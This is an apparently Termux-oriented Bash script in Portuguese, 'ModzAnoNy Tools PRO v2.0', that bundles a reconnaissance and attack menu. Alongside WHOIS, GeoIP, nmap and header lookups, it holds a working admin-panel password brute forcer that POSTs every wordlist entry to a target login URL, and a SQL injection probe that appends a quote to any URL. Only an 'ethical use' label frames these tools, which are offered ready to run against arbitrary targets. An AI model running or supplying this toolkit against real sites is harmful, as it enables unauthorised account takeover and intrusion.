#!/bin/bash

# -----------------------
# ModzAnoNy Tools PRO v2.0
# Hacking ético - Tudo em 1 script
# -----------------------

# Cores
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
PURPLE='\033[1;35m'
NC='\033[0m' # No Color

# Banner simples fixo
clear
echo -e "${CYAN}___________________________________"
echo -e "${CYAN}___ MODZANONY TOOLS PRO V2 ___"
echo -e "${CYAN}___________________________________${NC}"
echo ""

# Menu principal
show_menu() {
  echo -e "${PURPLE}Escolha uma opção abaixo:${NC}\n"
  echo -e "${RED}[ 01 ]${NC} WHOIS Lookup"
  echo -e "${RED}[ 02 ]${NC} IP Tracker"
  echo -e "${RED}[ 03 ]${NC} Nmap Tool"
  echo -e "${RED}[ 04 ]${NC} Subdomain Finder"
  echo -e "${RED}[ 05 ]${NC} HTTP Header Grabber"
  echo -e "${RED}[ 06 ]${NC} SQLi Vulnerability Scanner"
  echo -e "${RED}[ 07 ]${NC} Admin Panel Brute Force"
  echo -e "${RED}[ 08 ]${NC} Hash Identifier"
  echo -e "${RED}[ 09 ]${NC} URL Encoder/Decoder"
  echo -e "${RED}[ 10 ]${NC} Sair"
  echo ""
  echo -e "${PURPLE}[ ℹ️ ] Todas as ferramentas são 100% funcionais e para uso ético!${NC}"
  echo ""
}

# 1. WHOIS Lookup
whois_lookup() {
  echo -e "${GREEN}[ WHOIS Lookup ]${NC}"
  read -p "Digite o domínio (ex: example.com): " dominio
  if command -v whois >/dev/null 2>&1; then
    whois $dominio
  else
    echo "Instalando whois..."
    pkg install whois -y
    whois $dominio
  fi
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 2. IP Tracker
ip_tracker() {
  echo -e "${CYAN}[ IP Tracker - GeoIP + ASN ]${NC}"
  read -p "Digite o endereço IP: " ip
  if ! command -v jq >/dev/null 2>&1; then
    echo "Instalando jq..."
    pkg install jq -y
  fi
  curl -s https://ip-api.com/json/$ip | jq
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 3. Nmap Tool
nmap_tool() {
  echo -e "${YELLOW}[ Nmap Port Scanner ]${NC}"
  read -p "Digite o IP ou domínio do alvo: " alvo
  if command -v nmap >/dev/null 2>&1; then
    nmap -sV $alvo
  else
    echo "Instalando nmap..."
    pkg install nmap -y
    nmap -sV $alvo
  fi
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 4. Subdomain Finder
subdomain_finder() {
  echo -e "${GREEN}[ Subdomain Finder ]${NC}"
  read -p "Digite o domínio (ex: example.com): " domain
  echo "Procurando subdomínios comuns..."
  subs=(
    www
    mail
    ftp
    blog
    test
    dev
    shop
    admin
    smtp
    webmail
  )
  for sub in "${subs[@]}"; do
    host="$sub.$domain"
    ping -c 1 -W 1 $host &> /dev/null
    if [ $? -eq 0 ]; then
      echo "[+] Encontrado: $host"
    fi
  done
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 5. HTTP Header Grabber
http_header_grabber() {
  echo -e "${CYAN}[ HTTP Header Grabber ]${NC}"
  read -p "Digite a URL (ex: https://example.com): " url
  echo "Buscando cabeçalhos HTTP de $url ..."
  curl -I $url
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 6. SQLi Vulnerability Scanner
sqli_scanner() {
  echo -e "${RED}[ SQLi Vulnerability Scanner ]${NC}"
  read -p "Digite a URL alvo (ex: https://example.com/page.php?id=1): " url
  echo "Testando vulnerabilidade SQLi..."
  resp=$(curl -s "$url'")
  if echo "$resp" | grep -iq "syntax error\|mysql\|you have an error"; then
    echo -e "${RED}Possível vulnerabilidade SQLi detectada!${NC}"
  else
    echo "Nenhuma vulnerabilidade SQLi detectada (teste simples)."
  fi
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 7. Admin Panel Brute Force
admin_brute_force() {
  echo -e "${YELLOW}[ Admin Panel Brute Force ]${NC}"
  read -p "Digite a URL do login (ex: https://site.com/admin/login): " url
  read -p "Digite o usuário: " user
  read -p "Digite o caminho da wordlist (ex: /data/data/com.termux/files/home/passwords.txt): " wordlist
  if [ ! -f "$wordlist" ]; then
    echo "Wordlist não encontrada!"
    echo -e "\nPressione Enter para voltar ao menu..."
    read
    return
  fi
  echo "Iniciando brute force..."
  while read -r senha; do
    response=$(curl -s -X POST -d "username=$user&password=$senha" $url)
    if [[ ! $response =~ "login failed" ]]; then
      echo "Senha encontrada: $senha"
      echo -e "\nPressione Enter para voltar ao menu..."
      read
      return
    fi
  done < "$wordlist"
  echo "Nenhuma senha válida encontrada."
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 8. Hash Identifier
hash_identifier() {
  echo -e "${GREEN}[ Hash Identifier ]${NC}"
  read -p "Digite o hash: " hash
  length=${#hash}
  if [[ $length -eq 32 ]]; then
    echo "Provavelmente MD5"
  elif [[ $length -eq 40 ]]; then
    echo "Provavelmente SHA1"
  elif [[ $length -eq 64 ]]; then
    echo "Provavelmente SHA256"
  else
    echo "Hash desconhecido ou menos comum"
  fi
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# 9. URL Encoder/Decoder
url_encoder_decoder() {
  echo -e "${CYAN}[ URL Encoder/Decoder ]${NC}"
  echo "1) Encode URL"
  echo "2) Decode URL"
  read -p "Escolha a opção: " opt
  if [[ $opt == "1" ]]; then
    read -p "Digite a URL para codificar: " url
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$url'''))")
    echo "URL codificada: $encoded"
  elif [[ $opt == "2" ]]; then
    read -p "Digite a URL para decodificar: " url
    decoded=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$url'''))")
    echo "URL decodificada: $decoded"
  else
    echo "Opção inválida"
  fi
  echo -e "\nPressione Enter para voltar ao menu..."
  read
}

# Loop do menu
while true; do
  clear
  echo -e "${CYAN}___________________________________"
  echo -e "${CYAN}___ MODZANONY TOOLS PRO V2 ___"
  echo -e "${CYAN}___________________________________${NC}"
  echo ""
  show_menu
  read -p "Digite o número da ferramenta (10 para sair): " opcao
  case $opcao in
    1) whois_lookup ;;
    2) ip_tracker ;;
    3) nmap_tool ;;
    4) subdomain_finder ;;
    5) http_header_grabber ;;
    6) sqli_scanner ;;
    7) admin_brute_force ;;
    8) hash_identifier ;;
    9) url_encoder_decoder ;;
    10) echo -e "${GREEN}Saindo...${NC}" ; exit 0 ;;
    *) echo -e "${RED}Opção inválida!${NC}" ; sleep 1 ;;
  esac
done
